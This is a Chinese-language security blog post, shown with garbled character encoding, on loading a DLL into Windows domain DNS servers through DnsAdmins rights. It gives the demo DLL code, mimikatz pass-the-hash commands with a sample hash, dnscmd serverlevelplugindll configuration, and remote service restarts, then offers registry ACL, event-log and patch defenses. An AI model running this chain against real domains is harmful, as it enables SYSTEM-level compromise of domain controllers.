I"‚-<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>ç”±Shay Berå…¬å¼€çš„ä¸€ä¸ªåˆ©ç”¨æ–¹æ³•ï¼Œåœ¨åŸŸç¯å¢ƒä¸­ï¼Œä½¿ç”¨DNSAdminæƒé™èƒ½å¤Ÿåœ¨DNSæœåŠ¡å™¨ä¸Šå®ç°è¿œç¨‹åŠ è½½Dllã€‚è¿™ä¸ç®—æ¼æ´ï¼Œä½†å¯ä»¥ä½œä¸ºä¸€ä¸ªåŸŸæ¸—é€çš„æŠ€å·§ï¼Œæœ¬æ–‡å°†ç»“åˆè‡ªå·±çš„ç»éªŒæ•´ç†è¿™ä¸ªåˆ©ç”¨æŠ€å·§ï¼Œæ·»åŠ è‡ªå·±çš„ç†è§£ï¼Œå¯¹ç…§åˆ©ç”¨æ€è·¯ç»™å‡ºé˜²å¾¡å»ºè®®ã€‚</p>

<p>å‚è€ƒèµ„æ–™ï¼š</p>

<p>https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>è¯¦ç»†åˆ©ç”¨æ–¹æ³•</li>
  <li>é˜²å¾¡æ€è·¯</li>
</ul>

<h2 id="0x02-è¯¦ç»†åˆ©ç”¨æ–¹æ³•">0x02 è¯¦ç»†åˆ©ç”¨æ–¹æ³•</h2>
<hr />

<h4 id="åˆ©ç”¨æ¡ä»¶">åˆ©ç”¨æ¡ä»¶ï¼š</h4>

<p>å·²è·å¾—åŸŸå†…DnsAdminsï¼ŒDomain Adminsæˆ–è€…Enterprise Adminsç»„å†…ç”¨æˆ·çš„å£ä»¤æˆ–è€…hash</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>é»˜è®¤é…ç½®ä¸‹ï¼Œä¸ä»…ä»…æ˜¯DnsAdminsç»„å†…çš„ç”¨æˆ·ï¼ŒDomain Adminsæˆ–è€…Enterprise Adminsç»„å†…çš„ç”¨æˆ·ä¹Ÿå¯ä»¥</p>

<h3 id="1æŸ¥çœ‹å…³é”®ç»„å†…çš„ç”¨æˆ·">1ã€æŸ¥çœ‹å…³é”®ç»„å†…çš„ç”¨æˆ·</h3>

<p>æŸ¥çœ‹æ‰€æœ‰çš„ç»„ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net group /domain
</code></pre></div></div>

<p>æŸ¥çœ‹DnsAdminsç»„å†…çš„ç”¨æˆ·ï¼š</p>

<p>æ— æ³•ä½¿ç”¨<code class="language-plaintext highlighter-rouge">net group</code>å‘½ä»¤æŸ¥çœ‹ï¼Œå¯ä»¥ä½¿ç”¨<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>æŸ¥çœ‹</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module .\PowerView.ps1
Get-NetGroupMember -GroupName "DNSAdmins"
</code></pre></div></div>

<p>æŸ¥çœ‹Domain Adminsç»„å†…çš„ç”¨æˆ·ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net group "Domain Admins" /domain
</code></pre></div></div>

<p>æŸ¥çœ‹Enterprise Adminsç»„å†…çš„ç”¨æˆ·ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net group "Enterprise Admins" /domain
</code></pre></div></div>

<h3 id="2è·å¾—å…³é”®ç”¨æˆ·çš„å£ä»¤æˆ–è€…hash">2ã€è·å¾—å…³é”®ç”¨æˆ·çš„å£ä»¤æˆ–è€…hash</h3>

<p>éœ€è¦è·å¾—DnsAdminsï¼ŒDomain Adminsæˆ–è€…Enterprise Adminsç»„å†…ä»»ä¸€ç”¨æˆ·çš„å£ä»¤æˆ–è€…hash</p>

<h3 id="3å‡†å¤‡payloaddll">3ã€å‡†å¤‡Payload.dll</h3>

<p>éœ€è¦å®šä¹‰ä¸‰ä¸ªå¯¼å‡ºå‡½æ•°ï¼š</p>

<ul>
  <li>DnsPluginInitialize</li>
  <li>DnsPluginCleanup</li>
  <li>DnsPluginQuery</li>
</ul>

<p>å®šä¹‰å¯¼å‡ºå‡½æ•°å¯ä»¥å‚è€ƒä¹‹å‰å¼€æºçš„å·¥ç¨‹ï¼š</p>

<p>https://github.com/3gstudent/Add-Dll-Exports</p>

<p>è¿™é‡Œä½¿ç”¨defæ–‡ä»¶çš„æ–¹å¼å£°æ˜å¯¼å‡ºå‡½æ•°ï¼Œæµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p>

<p>dllmain.cppï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DWORD WINAPI DnsPluginInitialize(PVOID a1, PVOID a2)
{
	return 0;
}

DWORD WINAPI DnsPluginCleanup()
{
	return 0;
}

DWORD WINAPI DnsPluginQuery(PVOID a1, PVOID a2, PVOID a3, PVOID a4)
{
	WinExec("calc.exe", SW_SHOWNORMAL);
	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
</code></pre></div></div>

<p>.defæ–‡ä»¶ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EXPORTS
DnsPluginInitialize
DnsPluginCleanup
DnsPluginQuery
</code></pre></div></div>

<p>ç¼–è¯‘ç”Ÿæˆtestdns.dll</p>

<h3 id="4payloaddllä¿å­˜çš„ä½ç½®">4ã€Payload.dllä¿å­˜çš„ä½ç½®</h3>

<p>éœ€è¦èƒ½è¢«DNSæœåŠ¡å™¨è¿œç¨‹è®¿é—®</p>

<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨åŸŸå†…å…±äº«æ–‡ä»¶å¤¹SYSVOLï¼Œé»˜è®¤æ‰€æœ‰çš„åŸŸç”¨æˆ·éƒ½èƒ½è®¿é—®</p>

<p>æ›´å¤šç»†èŠ‚å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« ï¼š<a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">ã€ŠåŸŸæ¸—é€â€”â€”åˆ©ç”¨SYSVOLè¿˜åŸç»„ç­–ç•¥ä¸­ä¿å­˜çš„å¯†ç ã€‹</a></p>

<p>æˆ‘çš„æµ‹è¯•åŸŸç¯å¢ƒåç§°ä¸ºtest.comï¼Œä½¿ç”¨çš„åŸŸå†…å…±äº«æ–‡ä»¶å¤¹è·¯å¾„ä¸ºï¼š<code class="language-plaintext highlighter-rouge">\\test.com\SYSVOL\test.com\scripts\testdns.dll</code></p>

<h3 id="5å‡†å¤‡dnsadmin">5ã€å‡†å¤‡dnsadmin</h3>

<p>é€šå¸¸ï¼ŒåŸŸå†…çš„Windowsä¸»æœºä¸æ”¯æŒdnsadminå‘½ä»¤</p>

<p>é»˜è®¤å®‰è£…çš„ç³»ç»Ÿï¼š</p>

<ul>
  <li>Windows Server 2003</li>
  <li>Windows Server 2008</li>
  <li>Windows Server 2003 R2</li>
  <li>Windows Server 2008 R2</li>
  <li>Windows Server 2012</li>
  <li>Windows Server 2003 with SP1</li>
  <li>â€¦</li>
</ul>

<p>å‚è€ƒèµ„æ–™ï¼š</p>

<p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc772069(v=ws.11)</p>

<p>Win7ç³»ç»Ÿåœ¨ä½¿ç”¨æ—¶éœ€è¦å®‰è£…Remote Server Administration Tools (RSAT)</p>

<p>è¿™é‡Œä»‹ç»åœ¨æœªå®‰è£…Remote Server Administration Tools (RSAT)çš„ç³»ç»Ÿä¸Šæ‰§è¡Œdnscmdå‘½ä»¤çš„æ–¹æ³•ï¼š</p>

<h4 id="1å°†dnscmdexeä¿å­˜åœ¨cwindowssystem32ä¸‹">(1)å°†dnscmd.exeä¿å­˜åœ¨C:\Windows\System32ä¸‹</h4>

<p>å¯ç”¨ä¸‹è½½åœ°å€:</p>

<p>https://github.com/3gstudent/test/blob/master/dnscmd.exe</p>

<h4 id="2å°†dnscmdexemuiä¿å­˜åœ¨cwindowssystem32en-usä¸‹">(2)å°†dnscmd.exe.muiä¿å­˜åœ¨C:\Windows\System32\en-USä¸‹</h4>

<p>å¯ç”¨ä¸‹è½½åœ°å€:</p>

<p>https://github.com/3gstudent/test/blob/master/dnscmd.exe.mui</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>dnscmd.exeå’Œdnscmd.exe.muiæ˜¯åœ¨æˆ‘çš„æµ‹è¯•ç³»ç»Ÿ(Windows Server 2008 R2x64)ä¸­è·å¾—çš„</p>

<p>æ–¹æ³•ç»†èŠ‚å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DNS%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96">ã€ŠåŸŸæ¸—é€â€”â€”DNSè®°å½•çš„è·å–ã€‹</a></p>

<h3 id="6å¯åŠ¨dnscmd">6ã€å¯åŠ¨dnscmd</h3>

<p>dnscmdä¸æ”¯æŒè¾“å…¥å‡­æ®è¿›è¡Œè¿œç¨‹æ“ä½œçš„åŠŸèƒ½ï¼Œè¿™é‡Œéœ€è¦ä½¿ç”¨mimikatzçš„Over pass the hashåŠŸèƒ½</p>

<p>æµ‹è¯•ç¯å¢ƒå·²è·å¾—å…³é”®ç”¨æˆ·çš„ä¿¡æ¯å¦‚ä¸‹ï¼š</p>

<p>ç”¨æˆ·åï¼šAdministrator
å£ä»¤ï¼šDomainAdmin456!
hashï¼šA55E0720F0041193632A58E007624B40</p>

<p>å‘½ä»¤è¡Œä¸‹æ‰§è¡Œï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "sekurlsa::pth /user:Administrator /domain:test.com /ntlm:A55E0720F0041193632A58E007624B40"
</code></pre></div></div>

<p>è¿™æ ·ä¼šå¼¹å‡ºä¸€ä¸ªcmd.exeï¼Œåœ¨cmd.exeä¸­æ‰§è¡Œdnscmdå‘½ä»¤å³å¯</p>

<p>ä¹Ÿå¯ä»¥å®ç°è‡ªåŠ¨åŒ–è¾“å…¥ï¼š</p>

<p>å‘½ä»¤è¡Œä¸‹æ‰§è¡Œï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "sekurlsa::pth /user:Administrator /domain:test.com /ntlm:A55E0720F0041193632A58E007624B40 /run:\"cmd.exe /c c:\test\1.bat\""
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">c:\test\1.bat</code>ä¸­ä¿å­˜dnscmdçš„å‘½ä»¤</p>

<h3 id="7ä½¿ç”¨dnscmdå‘½ä»¤">7ã€ä½¿ç”¨dnscmdå‘½ä»¤</h3>

<p>DNSæœåŠ¡å™¨çš„IPï¼š192.168.10.1</p>

<p>å‘½ä»¤è¡Œæ‰§è¡Œï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnscmd 192.168.10.1 /config /serverlevelplugindll \\test.com\SYSVOL\test.com\scripts\testdns.dll
</code></pre></div></div>

<p>å¯¹äºDNSæœåŠ¡å™¨æ¥è¯´ï¼Œæ­¤æ—¶ä¼šæ–°å»ºä¸€ä¸ªæ³¨å†Œè¡¨é¡¹</p>

<p>ä½ç½®ï¼š<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\</code></p>

<ul>
  <li>ServerLevelPluginDll</li>
  <li>REG_SZ</li>
  <li><code class="language-plaintext highlighter-rouge">\\test.com\SYSVOL\test.com\scripts\testdns.dll</code></li>
</ul>

<h3 id="8é‡å¯dnsæœåŠ¡åä¼šåŠ è½½dll">8ã€é‡å¯DNSæœåŠ¡åä¼šåŠ è½½dll</h3>

<p>ç­‰å¾…DNSæœåŠ¡å™¨é‡å¯</p>

<p>æˆ–è€…è¿œç¨‹é‡å¯DNSæœåŠ¡å™¨ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc \\192.168.10.1 stop dns
sc \\192.168.10.1 start dns
</code></pre></div></div>

<p>DNSæœåŠ¡å™¨çš„åå°è¿›ç¨‹å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-5-22/2-1.png" alt="Alt text" /></p>

<p>dns.exeå°†ä¼šå¤šæ¬¡è°ƒç”¨testdns.dllï¼Œæƒé™ä¸ºSystem</p>

<h3 id="9å®é™…åˆ©ç”¨">9ã€å®é™…åˆ©ç”¨</h3>

<p>å®é™…ç¯å¢ƒä¸­ï¼Œé€šå¸¸DNSæœåŠ¡å™¨å’ŒåŸŸæ§åˆ¶å™¨æ˜¯åŒä¸€å°ä¸»æœº</p>

<h2 id="0x03-é˜²å¾¡å»ºè®®">0x03 é˜²å¾¡å»ºè®®</h2>
<hr />

<h3 id="1æ§åˆ¶æƒé™">1ã€æ§åˆ¶æƒé™</h3>

<p>é¿å…å…³é”®ç”¨æˆ·å‡­æ®è¢«æ”»å‡»è€…è·å¾—</p>

<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>æŸ¥çœ‹å…³é”®ç”¨æˆ·ç™»é™†è¿‡å“ªäº›ä¸»æœº</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module .\PowerView.ps1
Invoke-UserHunter -UserName AdministratorUser
</code></pre></div></div>

<h3 id="2ç›‘æ§å’Œè®¾ç½®æ³¨å†Œè¡¨">2ã€ç›‘æ§å’Œè®¾ç½®æ³¨å†Œè¡¨</h3>

<p>ä½ç½®ï¼š<code class="language-plaintext highlighter-rouge">KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\</code></p>

<p>åˆ©ç”¨dnscmdåœ¨DNSæœåŠ¡å™¨ä¸Šå®ç°è¿œç¨‹åŠ è½½Dllæ—¶ï¼Œä¼šä»¥Systemæƒé™ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œå¦‚æœä¿®æ”¹æ³¨å†Œè¡¨<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\</code>çš„ACL(Access Control List)ï¼Œåˆ é™¤Systemç”¨æˆ·çš„Set Valueæƒé™ï¼Œèƒ½å¤Ÿé˜»æ­¢è¿™ä¸ªæ–¹æ³•çš„åˆ©ç”¨</p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-5-22/2-2.png" alt="Alt text" /></p>

<p>ä½†æœ‰å¯èƒ½å½±å“å…¶ä»–æ­£å¸¸åŠŸèƒ½ï¼Œè¯¥æ³¨å†Œè¡¨é¡¹ä¸‹çš„å…¶ä»–é”®å€¼ä¿¡æ¯å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters
    GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
    EnableGlobalQueryBlockList    REG_DWORD    0x1
    PreviousLocalHostname    REG_SZ    WIN-F08C969D7FM.test.com
    BootMethod    REG_DWORD    0x3
    AdminConfigured    REG_DWORD    0x1
</code></pre></div></div>

<h3 id="3æŸ¥çœ‹æ—¥å¿—">3ã€æŸ¥çœ‹æ—¥å¿—</h3>

<h4 id="1è®°å½•dnsæœåŠ¡çš„å¯åŠ¨å’Œåœæ­¢">(1)è®°å½•DNSæœåŠ¡çš„å¯åŠ¨å’Œåœæ­¢</h4>

<p>ä½ç½®ï¼š<code class="language-plaintext highlighter-rouge">Application and Services Logs</code>-&gt;<code class="language-plaintext highlighter-rouge">DNS Server</code></p>

<p>å‘½ä»¤è¡ŒæŸ¥çœ‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil qe "dns server" /rd:true /f:text
</code></pre></div></div>

<p>IDä¸º2ä»£è¡¨DNSæœåŠ¡å¯åŠ¨ï¼ŒIDä¸º4ä»£è¡¨DNSæœåŠ¡å…³é—­</p>

<h4 id="2è®°å½•æ·»åŠ dllçš„æ“ä½œ">(2)è®°å½•æ·»åŠ Dllçš„æ“ä½œ</h4>

<p>éœ€è¦ä½¿ç”¨å¢å¼ºç‰ˆçš„DNSæ—¥å¿—è®°å½•å’Œè¯Šæ–­åŠŸèƒ½ï¼ŒServer2016é»˜è®¤æ”¯æŒï¼ŒServer2012éœ€è¦å®‰è£…è¡¥ä¸2956577</p>

<p>å‚è€ƒæ–‡æ¡£ï¼š</p>

<p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn800669(v=ws.11)</p>

<p>è¡¥ä¸è¯´æ˜ï¼š</p>

<p>https://support.microsoft.com/en-us/help/2956577/update-adds-query-logging-and-change-auditing-to-windows-dns-servers</p>

<p>è¡¥ä¸ä¸‹è½½ï¼š</p>

<p>https://www.catalog.update.microsoft.com/Search.aspx?q=2956577</p>

<p>æ·»åŠ Dllçš„æ“ä½œä¼šäº§ç”ŸIDä¸º541çš„æ—¥å¿—</p>

<h2 id="0x04-å°ç»“">0x04 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡ä»‹ç»äº†åˆ©ç”¨dnscmdåœ¨DNSæœåŠ¡å™¨ä¸Šå®ç°è¿œç¨‹åŠ è½½Dllçš„æ–¹æ³•ï¼Œç»“åˆåˆ©ç”¨æ€è·¯ç»™å‡ºé˜²å¾¡å»ºè®®ã€‚</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET